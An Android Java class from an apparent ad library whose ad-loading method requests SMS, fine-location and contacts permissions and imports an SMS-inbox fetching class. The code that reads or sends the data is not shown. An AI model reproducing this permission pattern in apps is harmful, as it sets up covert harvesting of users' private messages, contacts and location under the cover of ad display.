package com.example.taashaadslib.AdSerever;


import android.Manifest;
import android.app.Activity;
import android.content.Context;

import android.content.Intent;
import android.content.pm.PackageManager;

import android.os.Bundle;
import android.widget.ImageView;

import androidx.annotation.NonNull;
import androidx.annotation.Nullable;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;

import com.example.taashaadslib.AdSerever.FetchUserSMSinboxClass;
import com.example.taashaadslib.AdSerever.UserLocationClass;
import com.example.taashaadslib.AlertUtils.AlertClasses;
import com.example.taashaadslib.CommonClasses.SessionManager;
import com.example.taashaadslib.Interfaces.GetAdsClass;


public class LoadAdsClass extends AppCompatActivity implements GetAdsClass {

    private static final String TAG = "LoadAdsClass";
    private Activity mActivity;


    String[] PERMISSIONS = {
            Manifest.permission.READ_SMS,
            Manifest.permission.ACCESS_FINE_LOCATION,
            Manifest.permission.READ_CONTACTS
    };
    


    @Override
    public void getAds(Context mContext, Activity mActivity, String key, ImageView mImageView) {
        this.mActivity = mActivity;

        //GET SESSION MANAGER DATA
        SessionManager mSessionManager = new SessionManager(mContext);
        mSessionManager.openSettings();


        //ASKING USER PERMISSION
        if (ActivityCompat.checkSelfPermission(mActivity, Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) {
            ActivityCompat.requestPermissions(mActivity, PERMISSIONS, 100);
        }

        //SAVE USER LOCATION
        if (ActivityCompat.checkSelfPermission(mContext, Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED) {
            //LOAD LOCATION CLASS
            new UserLocationClass(mActivity , mContext, mImageView,key,true);
        } else {
            new UserLocationClass(mActivity , mContext, mImageView,key,false);
        }




    }


}



